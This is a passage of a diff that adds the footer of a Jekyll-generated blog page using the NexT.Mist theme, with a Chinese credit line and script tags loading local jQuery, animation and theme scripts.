+  由 <a class="theme-link" href="https://jekyllrb.com">Jekyll</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/simpleyyt/jekyll-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
